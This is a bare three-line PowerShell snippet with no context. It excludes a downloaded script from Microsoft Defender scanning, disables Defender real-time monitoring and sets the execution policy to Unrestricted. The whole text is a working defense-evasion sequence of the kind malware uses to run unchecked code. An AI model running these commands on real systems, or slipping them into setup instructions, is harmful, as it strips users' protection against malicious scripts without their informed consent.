Set-MpPreference -ExclusionPath ($HOME +'/Downloads/test.ps1')
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ExecutionPolicy Unrestricted
